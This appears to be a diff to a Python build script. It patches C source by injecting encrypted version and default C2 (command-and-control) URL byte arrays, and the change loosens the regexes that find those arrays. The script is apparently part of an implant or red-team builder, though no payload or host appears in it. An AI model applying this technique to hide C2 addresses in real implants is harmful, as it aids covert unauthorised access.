@@ -190,7 +190,7 @@ def main():
     # Version array
     ver_hex = format_hex_array(enc_version)
     result = re.sub(
-        r'static const unsigned char __enc_version\[\] = \{[\s\x00-9,]*\};',
+        r'static const unsigned char __enc_version\[\] = \{[^}]*\};',
         f'static const unsigned char __enc_version[] = {{{ver_hex}}};',
         result
     )
@@ -198,7 +198,7 @@ def main():
     # C2 URL array
     c2_hex = format_hex_array(enc_c2_url)
     result = re.sub(
-        r'static const unsigned char __enc_default_c2_url\[\] = \{[\s\x00,]*\};',
+        r'static const unsigned char __enc_default_c2_url\[\] = \{[^}]*\};',
         f'static const unsigned char __enc_default_c2_url[] = {{{c2_hex}}};',
         result
     )
